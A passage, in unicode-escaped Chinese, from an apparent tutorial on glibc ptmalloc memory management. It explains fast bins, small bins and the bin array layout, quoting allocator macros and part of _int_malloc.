\u4e2d\u6311\u9009\u4e00\u5757\u5408\u9002\u7684\u7ed9\u7528\u6237\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9891\u7e41\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u964d\u4f4e\u5185\u5b58\u5206\u914d\u7684\u5f00\u9500\u3002 \u5728\u5177\u4f53\u7684\u5b9e\u73b0\u4e2d\uff0cptmalloc \u91c7\u7528\u5206\u7bb1\u5f0f\u65b9\u6cd5\u5bf9\u7a7a\u95f2\u7684 chunk \u8fdb\u884c\u7ba1\u7406\u3002\u9996\u5148\uff0c\u5b83\u4f1a\u6839\u636e\u7a7a\u95f2\u7684 chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u5c06 chunk \u521d\u6b65\u5206\u4e3a 4 \u7c7b\uff1afast bins\uff0csmall bins\uff0clarge bins\uff0cunsorted bin\u3002\u6bcf\u7c7b\u4e2d\u4ecd\u7136\u6709\u66f4\u7ec6\u7684\u5212\u5206\uff0c\u76f8\u4f3c\u5927\u5c0f\u7684 chunk \u4f1a\u7528\u53cc\uff08\u5355\uff09\u5411\u94fe\u8868\u94fe\u63a5\u8d77\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6bcf\u7c7b bin \u7684\u5185\u90e8\u4ecd\u7136\u4f1a\u6709\u591a\u4e2a\u4e92\u4e0d\u76f8\u5173\u7684\u94fe\u8868\u6765\u4fdd\u5b58\u4e0d\u540c\u5927\u5c0f\u7684 chunk \u3002 \u5bf9\u4e8e small bins\uff0clarge bins\uff0cunsorted bin \u6765\u8bf4\uff0cptmalloc \u5c06\u5b83\u4eec\u7ef4\u62a4\u5728\u540c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u3002\u8fd9\u4e9b bin \u5bf9\u5e94\u7684\u6570\u636e\u7ed3\u6784\u5728 malloc_state \u4e2d\uff0c\u5982\u4e0b #define NBINS 128 /* Normal bins packed as described above */ mchunkptr bins[ NBINS * 2 - 2 ]; \u4e00\u4e2a bin \u76f8\u5f53\u4e8e\u4e00\u4e2a chunk \u94fe\u8868\uff0c\u6211\u4eec\u628a\u6bcf\u4e2a\u94fe\u8868\u7684\u5934\u8282\u70b9 chunk \u4f5c\u4e3a bins \u6570\u7ec4\uff0c\u4f46\u662f\u7531\u4e8e\u8fd9\u4e2a\u5934\u8282\u70b9\u4f5c\u4e3a bin \u8868\u5934\uff0c\u5176 prev_size \u4e0e size \u5b57\u6bb5\u662f\u6ca1\u6709\u4efb\u4f55\u5b9e\u9645\u4f5c\u7528\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u5b58\u50a8\u5934\u8282\u70b9 chunk \u7684\u65f6\u5019\u4ec5\u4ec5\u53ea\u9700\u8981\u5b58\u50a8\u5934\u8282\u70b9 chunk \u7684 fd \u548c bk \u5373\u53ef\uff0c\u800c\u5176\u4e2d\u7684 prev_size \u4e0e size \u5b57\u6bb5\u88ab\u91cd\u7528\u4e3a\u53e6\u4e00\u4e2a bin \u7684\u5934\u8282\u70b9\u7684 fd \u4e0e bk\uff0c\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7a7a\u95f4\uff0c\u5e76\u63d0\u9ad8\u53ef\u7528\u6027\u3002\u56e0\u6b64 \u6211\u4eec\u4ec5\u4ec5\u53ea\u9700\u8981 mchunkptr \u7c7b\u578b\u7684\u6307\u9488\u6570\u7ec4\u5c31\u8db3\u591f\u5b58\u50a8\u8fd9\u4e9b\u5934\u8282\u70b9 \uff0c\u90a3 prev_size \u4e0e size \u5b57\u6bb5\u5230\u5e95\u662f\u600e\u4e48\u91cd\u7528\u7684\u5462\uff1f\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u7cfb\u7edf\u4e3a\u4f8b \u542b\u4e49 bin1 \u7684 fd/bin2 \u7684 prev_size bin1 \u7684 bk/bin2 \u7684 size bin2 \u7684 fd/bin3 \u7684 prev_size bin2 \u7684 bk/bin3 \u7684 size bin \u4e0b\u6807 0 1 2 3 \u53ef\u4ee5\u770b\u51fa\u9664\u4e86\u7b2c\u4e00\u4e2a bin\uff08unsorted bin\uff09\u5916\uff0c\u540e\u9762\u7684\u6bcf\u4e2a bin \u7684\u8868\u5934 chunk \u4f1a\u91cd\u7528\u524d\u9762\u7684 bin \u8868\u5934 chunk \u7684 fd \u4e0e bk \u5b57\u6bb5\uff0c\u5c06\u5176\u89c6\u4e3a\u5176\u81ea\u8eab\u7684 prev_size \u548c size \u5b57\u6bb5\u3002\u8fd9\u91cc\u4e5f\u8bf4\u660e\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c bin \u7684\u4e0b\u6807\u548c\u6211\u4eec\u6240\u8bf4\u7684\u7b2c\u51e0\u4e2a bin \u5e76\u4e0d\u662f\u4e00\u81f4\u7684\u3002\u540c\u65f6\uff0cbin \u8868\u5934\u7684 chunk \u5934\u8282\u70b9 \u7684 prev_size \u4e0e size \u5b57\u6bb5\u4e0d\u80fd\u968f\u4fbf\u4fee\u6539\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u662f\u5176\u5b83 bin \u8868\u5934 chunk \u7684 fd \u548c bk \u5b57\u6bb5\u3002 \u6570\u7ec4\u4e2d\u7684 bin \u4f9d\u6b21\u4ecb\u7ecd\u5982\u4e0b \uff08\u7d22\u5f15\uff09\u7b2c\u4e00\u4e2a\u4e3a unsorted bin\uff0c\u5b57\u5982\u5176\u9762\uff0c\u8fd9\u91cc\u9762\u7684 chunk \u6ca1\u6709\u8fdb\u884c\u6392\u5e8f\uff0c\u5b58\u50a8\u7684 chunk \u6bd4\u8f83\u6742\u3002 \u7d22\u5f15\u4ece 2 \u5230 63 \u7684 bin \u79f0\u4e3a small bin\uff0c\u540c\u4e00\u4e2a small bin \u94fe\u8868\u4e2d\u7684 chunk \u7684\u5927\u5c0f\u76f8\u540c\u3002\u4e24\u4e2a\u76f8\u90bb\u7d22\u5f15\u7684 small bin \u94fe\u8868\u4e2d\u7684 chunk \u5927\u5c0f\u76f8\u5dee\u7684\u5b57\u8282\u6570\u4e3a 2 \u4e2a\u673a\u5668\u5b57\u957f \uff0c\u5373 32 \u4f4d\u76f8\u5dee 8 \u5b57\u8282\uff0c64 \u4f4d\u76f8\u5dee 16 \u5b57\u8282\u3002 small bins \u540e\u9762\u7684 bin \u88ab\u79f0\u4f5c large bins\u3002large bins \u4e2d\u7684\u6bcf\u4e00\u4e2a bin \u90fd\u5305\u542b\u4e00\u5b9a\u8303\u56f4\u5185\u7684 chunk\uff0c\u5176\u4e2d\u7684 chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\u3002\u76f8\u540c\u5927\u5c0f\u7684 chunk \u540c\u6837\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\u3002 \u5728 glibc \u4e2d\u7528\u4e8e\u8bb0\u5f55 bin \u7684\u6570\u636e\u7ed3\u6784\u6709\u4e24\u79cd\uff0c\u5206\u522b\u4e3a\uff1a fastbinsY : \u8fd9\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u7528\u4e8e\u8bb0\u5f55\u6240\u6709\u7684 fast bin bin \u6570\u7ec4: \u8fd9\u4e5f\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u7528\u4e8e\u8bb0\u5f55\u9664 fast bin \u4e4b\u5916\u7684\u6240\u6709 bin \u3002\u4e8b\u5b9e\u4e0a\u8fd9\u4e2a\u6570\u7ec4\u5171\u6709 126 \u4e2a\u5143\u7d20\uff0c\u5206\u522b\u662f: [1] \u4e3a unsorted bin [2~63] \u4e3a small bin [64~126] \u4e3a large bin \u56de\u987e malloc_chunk \u7684\u6570\u636e\u7ed3\u6784\uff0c\u5176\u4e2d\u7684 fd \u548c bk \u6307\u9488\u5c31\u662f\u6307\u5411\u5f53\u524d chunk \u6240\u5c5e\u7684\u94fe\u8868\u4e2d forward chunk \u6216\u8005 backward chunk \uff0c \u56e0\u6b64\u4e00\u822c\u7684 bin \u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868 \uff08\u6709\u4f8b\u5916\uff09\u3002 \u6b64\u5916\uff0c\u4e0a\u8ff0\u8fd9\u4e9b bin \u7684\u6392\u5e03\u90fd\u4f1a\u9075\u5faa\u4e00\u4e2a\u539f\u5219\uff1a \u4efb\u610f\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u4e0d\u80fd\u5728\u4e00\u8d77 \u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684 chunk \u88ab\u91ca\u653e\u540e\u5c31\u7acb\u5373\u88ab\u653e\u5230 bin \u4e2d\u3002ptmalloc \u4e3a\u4e86\u63d0\u9ad8\u5206\u914d\u7684\u901f\u5ea6\uff0c\u4f1a\u628a\u4e00\u4e9b\u5c0f\u7684 chunk \u5148 \u653e\u5230 fast bins \u7684\u5bb9\u5668\u5185\u3002 \u800c\u4e14\uff0cfastbin \u5bb9\u5668\u4e2d\u7684 chunk \u7684\u4f7f\u7528\u6807\u8bb0\u603b\u662f\u88ab\u7f6e\u4f4d\u7684\uff0c\u6240\u4ee5\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u539f\u5219\u3002 bin \u901a\u7528\u7684\u5b8f\u5982\u4e0b typedef struct malloc_chunk *mbinptr; /* addressing -- note that bin_at(0) does not exist */ #define bin_at(m, i) \\ (mbinptr)(((char *) &((m)->bins[ ((i) -1) * 2 ])) - \\ offsetof(struct malloc_chunk, fd)) /* analog of ++bin */ //\u83b7\u53d6\u4e0b\u4e00\u4e2abin\u7684\u5730\u5740 #define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) << 1))) /* Reminders about list directionality within bins */ // \u8fd9\u4e24\u4e2a\u5b8f\u53ef\u4ee5\u7528\u6765\u904d\u5386bin // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5934\u7684 chunk #define first(b) ((b)->fd) // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5c3e\u7684 chunk #define last(b) ((b)->bk) Fast Bin \u5927\u591a\u6570\u7a0b\u5e8f\u7ecf\u5e38\u4f1a\u7533\u8bf7\u4ee5\u53ca\u91ca\u653e\u4e00\u4e9b\u6bd4\u8f83\u5c0f\u7684\u5185\u5b58\u5757\u3002\u5982\u679c\u5c06\u4e00\u4e9b\u8f83\u5c0f\u7684 chunk \u91ca\u653e\u4e4b\u540e\u53d1\u73b0\u5b58\u5728\u4e0e\u4e4b\u76f8\u90bb\u7684\u7a7a\u95f2\u7684 chunk \u5e76\u5c06\u5b83\u4eec\u8fdb\u884c\u5408\u5e76\uff0c\u90a3\u4e48\u5f53\u4e0b\u4e00\u6b21\u518d\u6b21\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u5c31\u9700\u8981\u5bf9 chunk \u8fdb\u884c\u5206\u5272\uff0c\u8fd9\u6837\u5c31\u5927\u5927\u964d\u4f4e\u4e86\u5806\u7684\u5229\u7528\u6548\u7387\u3002 \u56e0\u4e3a\u6211\u4eec\u628a\u5927\u90e8\u5206\u65f6\u95f4\u82b1\u5728\u4e86\u5408\u5e76\u3001\u5206\u5272\u4ee5\u53ca\u4e2d\u95f4\u68c0\u67e5\u7684\u8fc7\u7a0b\u4e2d\u3002 \u56e0\u6b64\uff0cptmalloc \u4e2d\u4e13\u95e8\u8bbe\u8ba1\u4e86 fast bin\uff0c\u5bf9\u5e94\u7684\u53d8\u91cf\u5c31\u662f malloc state \u4e2d\u7684 fastbinsY /* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn't much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ typedef struct malloc_chunk *mfastbinptr; /* This is in malloc_state. /* Fastbins */ mfastbinptr fastbinsY[ NFASTBINS ]; */ \u4e3a\u4e86\u66f4\u52a0\u9ad8\u6548\u5730\u5229\u7528 fast bin\uff0cglibc \u91c7\u7528 \u5355\u5411\u94fe\u8868 \u5bf9\u5176\u4e2d\u7684\u6bcf\u4e2a bin \u8fdb\u884c\u7ec4\u7ec7(\u53ea\u4f7f\u7528 fd \u6307\u9488)\uff0c\u5e76\u4e14 \u6bcf\u4e2a bin \u91c7\u53d6 LIFO \u7b56\u7565\uff08\u540e\u8fdb\u5148\u51fa\uff09 \uff0c\u6700\u8fd1\u91ca\u653e\u7684 chunk \u4f1a\u66f4\u65e9\u5730\u88ab\u5206\u914d\uff0c\u6240\u4ee5\u4f1a\u66f4\u52a0\u9002\u5408\u4e8e\u5c40\u90e8\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u7528\u6237\u9700\u8981\u7684 chunk \u7684\u5927\u5c0f\u5c0f\u4e8e fastbin \u7684\u6700\u5927\u5927\u5c0f\u65f6\uff0c ptmalloc \u4f1a\u9996\u5148\u5224\u65ad fastbin \u4e2d\u76f8\u5e94\u7684 bin \u4e2d\u662f\u5426\u6709\u5bf9\u5e94\u5927\u5c0f\u7684\u7a7a\u95f2\u5757\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u4f1a\u76f4\u63a5\u4ece\u8fd9\u4e2a bin \u4e2d\u83b7\u53d6 chunk\u3002\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0cptmalloc \u624d\u4f1a\u505a\u63a5\u4e0b\u6765\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002 fast bin \u4e2d\u65e0\u8bba\u662f\u6dfb\u52a0\u8fd8\u662f\u79fb\u9664 fast chunk \uff0c\u90fd\u662f\u5bf9\u201c\u94fe\u8868\u5c3e\u201d\u8fdb\u884c\u64cd\u4f5c\uff0c\u800c\u4e0d\u4f1a\u5bf9\u67d0\u4e2a\u4e2d\u95f4\u7684 fast chunk \u8fdb\u884c\u64cd\u4f5c\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08 32 \u4f4d\u7cfb\u7edf\u4e3a\u4f8b \uff09\uff0c fastbin \u4e2d\u9ed8\u8ba4\u652f\u6301\u6700\u5927\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\u4e3a 64 \u5b57\u8282\u3002\u4f46\u662f\u5176\u53ef\u4ee5\u652f\u6301\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u6700\u5927\u4e3a 80 \u5b57\u8282\u3002\u9664\u6b64\u4e4b\u5916\uff0c fastbin \u6700\u591a\u53ef\u4ee5\u652f\u6301\u7684 bin \u7684\u4e2a\u6570\u4e3a 10 \u4e2a \uff0c\u4ece\u6570\u636e\u7a7a\u95f4\u4e3a 8 \u5b57\u8282\u5f00\u59cb\u4e00\u76f4\u5230 80 \u5b57\u8282\uff08\u6ce8\u610f\u8fd9\u91cc\u8bf4\u7684\u662f\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\uff0c\u4e5f\u5373\u9664\u53bb prev_size \u548c size \u5b57\u6bb5\u90e8\u5206\u7684\u5927\u5c0f\uff09\u5b9a\u4e49\u5982\u4e0b\uff1a #define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1) #ifndef DEFAULT_MXFAST #define DEFAULT_MXFAST (64 * SIZE_SZ / 4) #endif /* The maximum fastbin request size we support */ #define MAX_FAST_SIZE (80 * SIZE_SZ / 4) /* Since the lowest 2 bits in max_fast don't matter in size comparisons, they are used as flags. */ /* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ //\u5224\u65ad\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk\uff0c1\u8868\u793a\u6ca1\u6709 #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)->flags & FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(&(M)->flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(&(M)->flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ // MORECORE\u662f\u5426\u8fd4\u56de\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002 // \u4e3b\u5206\u914d\u533a\u4e2d\u7684MORECORE\u5176\u5b9e\u4e3asbr()\uff0c\u9ed8\u8ba4\u8fd4\u56de\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4 // \u975e\u4e3b\u5206\u914d\u533a\u4f7f\u7528mmap()\u5206\u914d\u5927\u5757\u865a\u62df\u5185\u5b58\uff0c\u7136\u540e\u8fdb\u884c\u5207\u5206\u6765\u6a21\u62df\u4e3b\u5206\u914d\u533a\u7684\u884c\u4e3a // \u800c\u9ed8\u8ba4\u60c5\u51b5\u4e0bmmap\u6620\u5c04\u533a\u57df\u662f\u4e0d\u4fdd\u8bc1\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8fde\u7eed\u7684\uff0c\u6240\u4ee5\u975e\u4e3b\u5206\u914d\u533a\u9ed8\u8ba4\u5206\u914d\u975e\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002 #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)->flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)->flags &= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)->flags & ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)->flags |= ARENA_CORRUPTION_BIT) /* Set value of max_fast. Use impossibly small value if 0. Precondition: there are no existing fastbin chunks. Setting the value clears fastchunk bit but preserves noncontiguous bit. */ #define set_max_fast(s) \\ global_max_fast = \\ (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) & ~MALLOC_ALIGN_MASK)) #define get_max_fast() global_max_fast ptmalloc \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u8c03\u7528 set_max_fast(s) \u5c06\u5168\u5c40\u53d8\u91cf global_max_fast \u8bbe\u7f6e\u4e3a DEFAULT_MXFAST\uff0c\u4e5f\u5c31\u662f\u8bbe\u7f6e fast bins \u4e2d chunk \u7684\u6700\u5927\u503c\u3002\u5f53 MAX_FAST_SIZE \u88ab\u8bbe\u7f6e\u4e3a 0 \u65f6\uff0c\u7cfb\u7edf\u5c31\u4e0d\u4f1a\u652f\u6301 fastbin \u3002 \u90a3\u4e48 malloc \u64cd\u4f5c\u5177\u4f53\u5982\u4f55\u5904\u7406 fast chunk \u5462\uff1f \u5f53\u7528\u6237\u901a\u8fc7 malloc \u8bf7\u6c42\u7684\u5927\u5c0f\u5c5e\u4e8e fast chunk \u7684\u5927\u5c0f\u8303\u56f4\uff08\u6ce8\u610f\uff1a\u7528\u6237\u8bf7\u6c42 size \u52a0\u4e0a 16 \u5b57\u8282\u5c31\u662f\u5b9e\u9645\u5185\u5b58 chunk size \uff09\u3002\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019 fast bin \u652f\u6301\u7684\u6700\u5927\u5185\u5b58\u5927\u5c0f\u4ee5\u53ca\u6240\u6709 fast bin \u94fe\u8868\u90fd\u662f\u7a7a\u7684\uff0c\u6240\u4ee5\u5f53\u6700\u5f00\u59cb\u4f7f\u7528 malloc \u7533\u8bf7\u5185\u5b58\u7684\u65f6\u5019\uff0c\u5373\u4f7f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5c5e\u4e8e fast chunk \u7684\u5185\u5b58\u5927\u5c0f\uff08\u5373 16 \u5230 80 \u5b57\u8282\uff09\uff0c\u5b83\u4e5f\u4e0d\u4f1a\u4ea4\u7531 fast bin \u6765\u5904\u7406\uff0c\u800c\u662f\u5411\u4e0b\u4f20\u9012\u4ea4\u7531 small bin \u6765\u5904\u7406\uff0c\u5982\u679c small bin \u4e5f\u4e3a\u7a7a\u7684\u8bdd\u5c31\u4ea4\u7ed9 unsorted bin \u5904\u7406\u3002\u90a3\u4e48 fast bin \u662f\u5728\u54ea\uff1f\u600e\u4e48\u8fdb\u884c\u521d\u59cb\u5316\u7684\u5462\uff1f \u5f53\u6211\u4eec\u7b2c\u4e00\u6b21\u8c03\u7528 malloc \u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u6267\u884c _int_malloc \u51fd\u6570\uff0c\u8be5\u51fd\u6570\u9996\u5148\u4f1a\u53d1\u73b0\u5f53\u524d fast bin \u4e3a\u7a7a\uff0c\u5c31\u8f6c\u4ea4\u7ed9 small bin \u5904\u7406\uff0c\u8fdb\u800c\u53c8\u53d1\u73b0 small bin \u4e5f\u4e3a\u7a7a\uff0c\u5c31\u8c03\u7528 malloc_consolidate \u51fd\u6570\u5bf9 malloc_state \u7ed3\u6784\u4f53\u8fdb\u884c\u521d\u59cb\u5316\uff0c malloc_consolidate \u51fd\u6570\u4e3b\u8981\u5b8c\u6210\u4ee5\u4e0b\u51e0\u4e2a\u529f\u80fd\uff1a \u9996\u5148\u5224\u65ad\u5f53\u524d malloc_state \u7ed3\u6784\u4f53\u4e2d\u7684 fast bin \u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e3a\u7a7a\u5c31\u8bf4\u660e\u6574\u4e2a malloc_state \uff08 arena \uff09\u90fd\u6ca1\u6709\u5b8c\u6210\u521d\u59cb\u5316\uff0c\u9700\u8981\u5bf9 malloc_state \u8fdb\u884c\u521d\u59cb\u5316\u3002 malloc_state \u7684\u521d\u59cb\u5316\u64cd\u4f5c\u7531\u51fd\u6570 malloc_init_state(av) \u5b8c\u6210\uff0c\u8be5\u51fd\u6570\u5148\u521d\u59cb\u5316\u9664 fast bin \u4e4b\u5916\u7684\u6240\u6709\u7684 bin (\u6784\u5efa\u53cc\u94fe\u8868\uff0c\u8be6\u60c5\u89c1\u540e\u6587 small bins \u4ecb\u7ecd)\uff0c\u518d\u521d\u59cb\u5316 fast bins \u3002 \u5f53\u518d\u6b21\u6267\u884c malloc \u51fd\u6570\u7684\u65f6\u5019\uff0c\u6b64\u65f6 fast bin \u76f8\u5173\u6570\u636e\u4e0d\u4e3a\u7a7a\u4e86\uff0c\u5c31\u5f00\u59cb\u4f7f\u7528 fast bin \uff0c\u8fd9\u90e8\u5206\u4ee3\u7801\u5982\u4e0b\uff1a static void * _int_malloc (mstate av, size_t bytes) { // \u2026 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ //\u7b2c\u4e00\u6b21\u6267\u884cmalloc(fast chunk)\u65f6\u8fd9\u91cc\u5224\u65ad\u4e3afalse\uff0c\u56e0\u4e3a\u6b64\u65f6get_max_fast ()\u4e3a0 if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ())) { // use fast bin idx = fastbin_index (nb); mfastbinptr *fb = &fastbin (av, idx); mchunkptr pp = *fb; do { victim = pp; if (victim == NULL) break; } // remove chunk from fast bin while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))!= victim); if (victim != 0) { if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim)); return NULL; } check_remalloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } \u5f97\u5230\u7b2c\u4e00\u4e2a\u6765\u81ea\u4e8e fast bin \u7684 chunk \u4e4b\u540e\uff0c\u7cfb\u7edf\u5c31\u5c06\u8be5 chunk \u4ece\u5bf9\u5e94\u7684 fast bin \u4e2d\u79fb\u9664\uff0c\u5e76\u5c06\u5176\u5730\u5740\u8fd4\u56de\u7ed9\u7528\u6237\u3002 fastbin \u7684\u7d22\u5f15 #define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[ idx ]) /* offset 2 to use otherwise unindexable first 2 bins */ // chunk size=2*size_sz*(2+idx) // \u8fd9\u91cc\u8981\u51cf2\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u524d\u4e24\u4e2abin\u6ca1\u6709\u529e\u6cd5\u7d22\u5f15\u5230\u3002 #define fastbin_index(sz) \\ ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) \u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0cfastbin \u8303\u56f4\u7684 chunk \u7684 inuse \u59cb\u7ec8\u88ab\u7f6e\u4e3a 1\u3002\u56e0\u6b64\u5b83\u4eec\u4e0d\u4f1a\u548c\u5176\u5b83\u88ab\u91ca\u653e\u7684 chunk \u5408\u5e76\u3002 \u4f46\u662f\u5f53\u91ca\u653e\u7684 chunk \u4e0e\u8be5 chunk \u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5408\u5e76\u540e\u7684\u5927\u5c0f\u5927\u4e8e FASTBIN_CONSOLIDATION_THRESHOLD \u65f6\uff0c\u5185\u5b58\u788e\u7247\u53ef\u80fd\u6bd4\u8f83\u591a\u4e86\uff0c\u6211\u4eec\u5c31\u9700\u8981\u628a fast bins \u4e2d\u7684 chunk \u90fd\u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u788e\u7247\u5bf9\u7cfb\u7edf\u7684\u5f71\u54cd\u3002 /* FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free() that triggers automatic consolidation of possibly-surrounding fastbin chunks. This is a heuristic, so the exact value should not matter too much. It is defined at half the default trim threshold as a compromise heuristic to only attempt consolidation if it is likely to lead to trimming. However, it is not dynamically tunable, since consolidation reduces fragmentation surrounding large chunks even if trimming is not used. */ #define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) malloc_consolidate \u51fd\u6570\u53ef\u4ee5\u5c06 fastbin \u4e2d\u6240\u6709\u80fd\u548c\u5176\u5b83 chunk \u5408\u5e76\u7684 chunk \u5408\u5e76\u5728\u4e00\u8d77\u3002\u5177\u4f53\u5730\u53c2\u89c1\u540e\u7eed\u7684\u8be6\u7ec6\u51fd\u6570\u7684\u5206\u6790\u3002 /* Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ Small Bin small bins \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0e\u5176\u6240\u5728\u7684 bin \u7684 index \u7684\u5173\u7cfb\u4e3a\uff1achunk_size = 2 * SIZE_SZ *index\uff0c\u5177\u4f53\u5982\u4e0b \u4e0b\u6807 SIZE_SZ=4\uff0832 \u4f4d\uff09 SIZE_SZ=8\uff0864 \u4f4d\uff09 2 16 32 3 24 48 4 32 64 5 40 80 x 2*4*x 2*8*x 63 504 1008 small bins \u4e2d\u4e00\u5171\u6709 62 \u4e2a \u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u6bcf\u4e2a\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u90fd\u4e00\u81f4* \u3002\u6bd4\u5982\u5bf9\u4e8e 32 \u4f4d\u7cfb\u7edf\u6765\u8bf4\uff0c\u4e0b\u6807 2 \u5bf9\u5e94\u7684\u53cc\u5411\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u4e3a\u5747\u4e3a 16 \u5b57\u8282\u3002\u6bcf\u4e2a\u94fe\u8868\u90fd\u6709\u94fe\u8868\u5934\u7ed3\u70b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u65b9\u4fbf\u5bf9\u4e8e\u94fe\u8868\u5185\u90e8\u7ed3\u70b9\u7684\u7ba1\u7406\u3002\u6b64\u5916\uff0c small bins \u4e2d\u6bcf\u4e2a bin \u5bf9\u5e94\u7684\u94fe\u8868\u91c7\u7528 FIFO \u7684\u89c4\u5219 \uff08\u5148\u8fdb\u5148\u51fa\uff09\uff0c\u6240\u4ee5\u540c\u4e00\u4e2a\u94fe\u8868\u4e2d\u5148\u88ab\u91ca\u653e\u7684 chunk \u4f1a\u5148\u88ab\u5206\u914d\u51fa\u53bb\u3002* \u7269\u7406\u5730\u5740\u76f8\u90bb\u7684 free chunk \u9700\u8981\u8fdb\u884c\u5408\u5e76\u64cd\u4f5c\uff0c\u5373\u5408\u5e76\u6210\u4e00\u4e2a\u5927\u7684 free chunk \u3002 \u5f53\u91ca\u653e small chunk \u7684\u65f6\u5019\uff0c\u5148\u68c0\u67e5\u8be5 chunk \u76f8\u90bb\u7684 chunk \u662f\u5426\u4e3a free chunk \uff0c\u5982\u679c\u662f\u7684\u8bdd\u5c31\u8fdb\u884c\u5408\u5e76\u64cd\u4f5c\uff1a\u5c06\u8fd9\u4e9b chunk \u5408\u5e76\u6210\u65b0\u7684 chunk 